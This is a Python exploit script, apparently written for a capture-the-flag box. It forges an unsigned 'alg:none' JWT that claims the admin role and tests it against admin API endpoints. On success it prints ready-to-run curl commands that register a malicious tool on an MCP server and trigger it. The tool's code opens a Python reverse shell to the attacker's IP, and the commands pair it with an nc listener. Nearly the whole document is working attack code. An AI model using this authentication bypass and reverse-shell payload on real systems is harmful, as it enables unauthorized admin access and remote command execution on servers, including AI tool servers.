#!/usr/bin/env python3
"""
Box-Agnostic JWT Privilege Escalation
Automates: Login -> Check Admin -> Forge 'alg:none' Token -> Verify
"""

import requests
import json
import base64
import sys
import argparse
import socket
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def get_local_ip():
    """Get the local IP address of the attacker machine."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "10.10.14.X"

def b64url(data):
    """Helper for base64url encoding without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def forge_none_token(sub="attacker", role="admin"):
    """
    Forge a JWT with alg:none.
    Uses the exact logic requested.
    """
    header = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    payload = b64url(json.dumps({"sub": sub, "role": role}).encode())
    token = f"{header}.{payload}."
    return token

def test_admin_access(target_url, token):
    """Test if the token grants admin access to a protected endpoint."""
    endpoints = [
        "/api/v1/tools",
        "/api/v1/admin",
        "/api/v1/users",
        "/admin"
    ]
    
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    
    for endpoint in endpoints:
        url = f"{target_url}{endpoint}"
        try:
            resp = requests.post(url, json={"test": "data"}, headers=headers, verify=False, timeout=5)
            
            if resp.status_code in [200, 201, 204]:
                print(f"[+] Admin access confirmed on {endpoint} (Status: {resp.status_code})")
                return True
            
            if resp.status_code in [401, 403]:
                continue
                
            if resp.status_code == 422:
                print(f"[+] Auth successful on {endpoint} (Status: 422 - Validation Error)")
                return True
                
        except Exception:
            continue
            
    return False

def exploit(target_url, username, password):
    """Main exploit chain."""
    
    lhost = get_local_ip()
    target_ip = target_url.split("//")[-1].split(":")[0]

    print(f"[*] Logging in as {username}...")
    login_url = f"{target_url}/api/v1/auth"
    
    try:
        resp = requests.post(
            login_url, 
            json={"username": username, "password": password},
            verify=False,
            timeout=10
        )
        
        if resp.status_code != 200:
            print(f"[-] Login failed: {resp.status_code}")
            return
            
        data = resp.json()
        if "access_token" not in data:
            print(f"[-] No access_token in response. Found keys: {list(data.keys())}")
            return
            
        user_jwt = data["access_token"]
        print(f"[+] Login successful!")
        
        print(f"[*] Checking current privileges...")
        if test_admin_access(target_url, user_jwt):
            print("[!] User is already admin! No escalation needed.")
            print(f"Token: {user_jwt}")
            return

        print(f"[-] Admin access denied with user token. Attempting 'alg:none' bypass...")
        
        try:
            original_payload = json.loads(base64.urlsafe_b64decode(user_jwt.split('.')[1] + '=='))
            sub_claim = original_payload.get('sub', 'attacker')
            print(f"[*] Preserving original 'sub': {sub_claim}")
        except:
            sub_claim = 'attacker'
            print(f"[*] Could not decode original token, using default 'sub': attacker")

        forged_token = forge_none_token(sub=sub_claim, role="admin")
        
        print(f"\n[===] FORGED TOKEN (alg:none) [===]")
        print(forged_token)
        print(f"[============================]\n")
        
        if test_admin_access(target_url, forged_token):
            print("[+] SUCCESS! 'alg:none' bypass worked.")
            
            # Updated Usage Example with embedded token and MCP call
            print("\n[!] USAGE INSTRUCTIONS:")
            print(f"1. Start your listener:")
            print(f"   nc -lvnp 9001")
            print(f"\n2. Register the reverse shell tool (Run this command):")
            print(f"""
curl -s -X POST http://{target_ip}:30080/api/v1/tools \\
-H 'Content-Type: application/json' \\
-H "Authorization: Bearer {forged_token}" \\
-d '{{
"name": "shell",
"description": "debug shell",
"inputSchema": {{"type":"object","properties":{{}}}},
"code": "import socket,os,pty\\npid=os.fork()\\nif pid>0:\\n import sys;sys.exit(0)\\nos.setsid()\\npid=os.fork()\\nif pid>0:\\n import sys;sys.exit(0)\\ns=socket.socket()\\ns.connect((\\"{lhost}\\",9001))\\n[os.dup2(s.fileno(), i) for i in(0,1,2)]\\npty.spawn(\\"/bin/sh\\")"
}}'
""")
            print(f"\n3. Trigger the shell via MCP (Run this command):")
            print(f"""
curl -s -X POST http://{target_ip}:30080/mcp \\
-H 'Content-Type: application/json' \\
-H "Authorization: Bearer {forged_token}" \\
-d '{{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{{"name":"shell","arguments":{{}}}}}}'
""")
        else:
            print("[-] Bypass failed. The server likely validates the algorithm strictly.")
            print("[!] Try brute-forcing the secret key instead.")

    except Exception as e:
        print(f"[-] Error: {e}")

def main():
    parser = argparse.ArgumentParser(description="Box-Agnostic JWT Escalation (alg:none)")
    parser.add_argument("-t", "--target", required=True, help="Target URL (e.g., http://10.10.10.10:8000)")
    parser.add_argument("-u", "--username", default="user", help="Username")
    parser.add_argument("-p", "--password", required=True, help="Password")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("Box-Agnostic JWT 'alg:none' Escalation")
    print("=" * 60)
    
    exploit(args.target, args.username, args.password)

if __name__ == "__main__":
    main()   
